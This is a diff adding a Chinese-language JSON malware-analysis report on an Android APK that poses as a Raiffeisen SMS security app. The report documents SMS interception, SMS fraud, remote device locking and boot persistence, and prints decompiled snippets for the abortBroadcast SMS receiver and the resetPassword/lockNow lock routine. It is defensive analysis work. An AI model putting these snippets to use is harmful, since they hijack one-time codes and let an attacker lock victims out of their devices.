@@ -1,0 +1,154 @@
+{
+  "APK信息": {
+    "文件名": "e799f4643fd5315ffe9e2fd0f47e0c49d8cffb40166f4f7fa9d3321bc4706e44.apk",
+    "sha256": "e799f4643fd5315ffe9e2fd0f47e0c49d8cffb40166f4f7fa9d3321bc4706e44",
+    "包名": "org.thoughtcrime.securesms",
+    "应用名": "Raiffeisen SmsSecurity",
+    "是否恶意": true,
+    "风险等级": "高",
+    "分析耗时(秒)": 385.7
+  },
+  "行为列表": [
+    {
+      "行为": "sms_fraud",
+      "中文名": "短信欺诈",
+      "MITRE": "T1416",
+      "置信度": "likely",
+      "子行为": [
+        {
+          "子行为": "sms_send",
+          "中文名": "短信发送",
+          "置信度": "likely",
+          "证据": {
+            "方法引用": [],
+            "权限": [
+              "android.permission.SEND_SMS"
+            ],
+            "字符串": [
+              "sendTextMessage",
+              "SmsManager"
+            ]
+          }
+        },
+        {
+          "子行为": "sms_intercept",
+          "中文名": "短信拦截",
+          "置信度": "likely",
+          "证据": {
+            "方法引用": [],
+            "权限": [
+              "android.permission.RECEIVE_SMS"
+            ],
+            "字符串": [
+              "abortBroadcast"
+            ]
+          }
+        }
+      ],
+      "恶意代码": [
+        {
+          "class_path": "Lorg\\thoughtcrime\\securesms\\DatabaseMigrationActivity;",
+          "method_signature": "onReceive(Context context, Intent intent)",
+          "malicious_behavior": "sms_fraud",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "private class NullReceiver extends BroadcastReceiver {\n    @Override\n    public void onReceive(Context context, Intent intent) {\n        abortBroadcast();\n    }\n}",
+          "malicious_code_snippet_context": "      }\n  \n      /* loaded from: classes.dex */\n>>>     private class NullReceiver extends BroadcastReceiver {\n>>>         private NullReceiver() {\n>>>         }\n>>> \n>>>         @Override // android.content.BroadcastReceiver\n>>>         public void onReceive(Context context, Intent intent) {\n              abortBroadcast();\n          }\n      }",
+          "behavior_description": "应用定义了一个空的 BroadcastReceiver，在接收到广播（通常是短信到达的有序广播）时，直接调用 abortBroadcast() 中止广播的继续传递。这会阻止系统短信应用或其他正常应用接收到短信，从而实现短信拦截和隐藏功能，可能导致验证码被劫持或重要通知被屏蔽。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "ransomware",
+      "中文名": "勒索软件",
+      "MITRE": "T1430,T1460",
+      "置信度": "confirmed",
+      "子行为": [
+        {
+          "子行为": "device_lock",
+          "中文名": "设备锁屏",
+          "置信度": "suspected",
+          "证据": {
+            "方法引用": [],
+            "权限": [],
+            "字符串": [
+              "lockNow",
+              "resetPassword",
+              "DevicePolicyManager"
+            ]
+          }
+        },
+        {
+          "子行为": "file_encryption",
+          "中文名": "文件加密",
+          "置信度": "confirmed",
+          "证据": {
+            "方法引用": [
+              "Ljavax/crypto/Cipher;->doFinal",
+              "Ljavax/crypto/Cipher;->init"
+            ],
+            "权限": [],
+            "字符串": [
+              "AES",
+              "encrypt",
+              "decrypt"
+            ]
+          }
+        }
+      ],
+      "恶意代码": [
+        {
+          "class_path": "Lorg\\thoughtcrime\\securesms\\xlibs\\SmsCommand;",
+          "method_signature": "if(this.sNumber != \"0\")",
+          "malicious_behavior": "ransomware",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "case LOCK:\n    if (this.sNumber != \"0\") {\n        DevicePolicyManager dpm = (DevicePolicyManager) ctx.getSystemService(\"device_policy\");\n        dpm.resetPassword(this.sNumber, 1);\n        dpm.lockNow();",
+          "malicious_code_snippet_context": "                  myFunctions.clearBuffers(ctx);\n                  myFunctions.setVar(\"PHONE_NUMBER\", \"\", ctx);\n                  return;\n>>>             case LOCK:\n>>>                 if (this.sNumber != \"0\") {\n>>>                     DevicePolicyManager dpm = (DevicePolicyManager) ctx.getSystemService(\"device_policy\");\n>>>                     dpm.resetPassword(this.sNumber, 1);\n>>>                     dpm.lockNow();\n                      myFunctions.sendSmsLog(\"Device locked\", ctx);\n                      return;\n                  }",
+          "behavior_description": "通过SMS指令远程触发设备锁定。攻击者通过短信发送密码值存储在this.sNumber中，当收到LOCK指令时，调用DevicePolicyManager.resetPassword()将设备密码重置为攻击者指定的值，并立即调用lockNow()锁定设备，使用户无法正常使用设备，构成勒索行为。UNLOCK指令则将密码重置为空并解锁，表明攻击者可完全控制设备的锁定状态。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "device_reboot",
+      "中文名": "设备重启",
+      "MITRE": "",
+      "置信度": "suspected",
+      "证据": {
+        "方法引用": [],
+        "权限": [],
+        "字符串": [
+          "reboot"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Lorg\\thoughtcrime\\securesms\\xbroadcast\\OnBootReceiver;",
+          "method_signature": "onReceive(Context context, Intent intent)",
+          "malicious_behavior": "device_reboot",
+          "behavior_type": "grayware",
+          "risk_level": "中",
+          "malicious_code_snippet": "context.startService(new Intent(\"XMainProcessStart\").putExtra(\"name\", DraftDatabase.DRAFT_VALUE));",
+          "malicious_code_snippet_context": "      @Override // android.content.BroadcastReceiver\n      public void onReceive(Context context, Intent intent) {\n          myFunctions.sendLog(\"REBOOT\", \"Device reboot fixed. Service started after reboot.\", context);\n>>>         context.startService(new Intent(\"XMainProcessStart\").putExtra(\"name\", DraftDatabase.DRAFT_VALUE));\n      }\n  }",
+          "behavior_description": "该代码在设备重启完成后接收到广播被触发，通过调用 context.startService() 启动名为 \"XMainProcessStart\" 的服务，实现开机自启动和后台进程保活，确保恶意服务在设备重启后能够持续运行。",
+          "glm_analyzed": true
+        }
+      ]
+    }
+  ],
+  "覆盖范围": {
+    "静态分析": "完整",
+    "动态分析": "未执行",
+    "方法引用分析": "完整",
+    "JADX反编译": "完整",
+    "LLM语义分析": "已执行",
+    "LLM交叉验证": "已执行",
+    "验证模型": "qwen3.7-plus",
+    "局限性": [
+      "C2服务器.是否活跃: 需动态分析",
+      "C2服务器.轮询间隔(秒): 需动态分析"
+    ]
+  }
+}
